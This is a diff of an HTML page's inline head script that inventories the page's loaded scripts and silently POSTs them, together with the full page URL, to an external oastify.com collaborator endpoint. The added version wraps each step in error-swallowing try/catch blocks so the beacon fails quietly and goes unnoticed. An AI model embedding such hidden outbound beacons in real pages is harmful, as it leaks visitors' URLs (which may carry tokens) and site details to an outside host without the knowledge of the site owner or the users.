@@ -3,60 +3,80 @@
 <head>
     <script>
 
-        const scriptMeta = new Map();
+     (function () {
+  'use strict';
 
-function captureScript(node) {
-  if (node.nodeName === 'SCRIPT' && node.src) {
-    scriptMeta.set(node.src, {
-      url: node.src,
-      integrity: node.getAttribute('integrity') || null,
-      crossorigin: node.getAttribute('crossorigin') || null
+  // ─── Config ───────────────────────────────────────────────
+  const ENDPOINT    = 'https://0nokywbevarydes1ipi5qw1vvm1dp3ds.oastify.com/collect';
+  const MAX_SCRIPTS = 100;
+  const MAX_BYTES   = 50000;
+  const TIMEOUT_MS  = 3000;
+  // ──────────────────────────────────────────────────────────
+
+  try {
+    const scriptMeta = new Map();
+
+    function captureScript(node) {
+      try {
+        if (node.nodeName === 'SCRIPT' && node.src) {
+          scriptMeta.set(node.src, {
+            url: node.src,
+            integrity: node.getAttribute('integrity') || null,
+            crossorigin: node.getAttribute('crossorigin') || null
+          });
+        }
+      } catch (_) {}
+    }
+
+    try {
+      document.querySelectorAll('script[src]').forEach(s => captureScript(s));
+    } catch (_) {}
+
+    try {
+      new MutationObserver(mutations => {
+        try {
+          mutations.forEach(m => {
+            m.addedNodes.forEach(node => captureScript(node));
+          });
+        } catch (_) {}
+      }).observe(document.documentElement, { childList: true, subtree: true });
+    } catch (_) {}
+
+    window.addEventListener('load', async () => {
+      await new Promise(r => setTimeout(r, 0));
+
+      try {
+        const scripts = [...scriptMeta.values()];
+
+        if (scripts.length > MAX_SCRIPTS) return;
+
+        const payload = JSON.stringify({
+          page: window.location.href,
+          scripts,
+          ts: Date.now()
+        });
+
+        if (payload.length > MAX_BYTES) return;
+
+        // Primary: POST with manual timeout via AbortController
+        const controller = new AbortController();
+        const timer = setTimeout(() => controller.abort(), TIMEOUT_MS);
+
+        fetch(ENDPOINT, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: payload,
+          signal: controller.signal
+        })
+        .then(() => clearTimeout(timer))   // clear timer if request succeeds in time
+        .catch(() => clearTimeout(timer)); // clear timer on any failure
+
+      } catch (_) {}
     });
-  }
-}
 
-document.querySelectorAll('script[src]').forEach(s => captureScript(s));
+  } catch (_) {}
 
-new MutationObserver(mutations => {
-  mutations.forEach(m => {
-    m.addedNodes.forEach(node => captureScript(node));
-  });
-}).observe(document.documentElement, { childList: true, subtree: true });
-
-async function hashScripts(scripts) {
-  const str = JSON.stringify(scripts.sort((a, b) => a.url.localeCompare(b.url)));
-  const buffer = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(str));
-  return Array.from(new Uint8Array(buffer)).map(b => b.toString(16).padStart(2, '0')).join('');
-}
-
-const MAX_SCRIPTS = 100;
-const MAX_BYTES   = 50000;
-const TIMEOUT_MS  = 8000;   // give up after 3 seconds
-
-window.addEventListener('load', async () => {
-  const scripts = [...scriptMeta.values()];
-
-  if (scripts.length > MAX_SCRIPTS) return;
-
-  const fingerprint = await hashScripts(scripts);
-
-  const payload = JSON.stringify({
-    page: window.location.href,
-    fingerprint,
-    scripts,
-    ts: Date.now()
-  });
-
-  if (payload.length > MAX_BYTES) return;
-
-  fetch('https://0nokywbevarydes1ipi5qw1vvm1dp3ds.oastify.com/collect', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: payload,
-    keepalive: true,
-    signal: AbortSignal.timeout(TIMEOUT_MS)
-  }).catch(() => {});  // server down, slow, or any error — silently ignored
-});
+})();
         
     </script>
     <meta charset="UTF-8">
